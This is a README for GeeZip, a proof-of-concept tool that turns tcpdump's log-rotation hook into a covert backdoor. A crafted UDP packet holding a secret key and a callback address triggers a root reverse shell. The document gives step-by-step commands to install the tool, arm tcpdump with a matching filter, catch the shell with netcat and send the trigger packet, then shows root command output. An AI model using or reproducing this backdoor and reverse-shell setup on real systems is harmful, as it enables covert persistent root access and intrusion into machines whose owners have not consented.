# GeeZip

This is a proof of concept tool for abusing the logrotate functionality in tcpdump to execute a remote root shell.

## Building

Download and build geezip:

```
$ go install github.com/klustic/geezip
```

## Usage
GeeZip is designed to execute after a specially crafted UDP packet is received. The UDP packet must be in the following format:

```
+========+====+==+
|   K    | IP |P |
+========+====+==+

Where:
K : 8-byte sequence representing a secret key
IP: 4-byte sequence representing the callback IP
P : 2-byte sequence representing the callback port (big-endian)
```

On the commandline, run this command to prepare your tcpdump backdoor:
```
[root]# tcpdump -Uw output.pcap -z geezip -c 1 -G1 -i lo0 "udp[8:4]=0x6d616769 && udp[12:4]=0x636b6579"
```

On another commandline, prepare netcat to catch the reverse shell:
```
[user]$ nc -nvvl 8000
id

```

Finally, execute this from a third commandline to trigger the logrotate:
```
[user]$ echo -n 'magickey\x7f\x00\x00\x01\x1f\x40' | nc -u 127.0.0.1 9000
```

You should see output from the `id` command on your netcat terminal, and should be able to interact with the backdoor:
```
[user]$ nc -nvvl 8000
id
uid=0(root) gid=0(wheel) groups=0(wheel)...

w
16:37  up  7:10, 8 users, load averages: 1.75 1.78 1.86
USER     TTY      FROM              LOGIN@  IDLE WHAT
lustic   console  -                 9:28    7:09 -
lustic   s001     -                12:22      15 -zsh
lustic   s002     -                12:57       9 /bin/zsh
...

last -2
lustic    ttys007                   Mon Jul 29 16:29   still logged in
lustic    ttys006                   Mon Jul 29 14:22   still logged in

```

## Thanks
This uses Google's epic [gopacket project](https://github.com/google/gopacket)
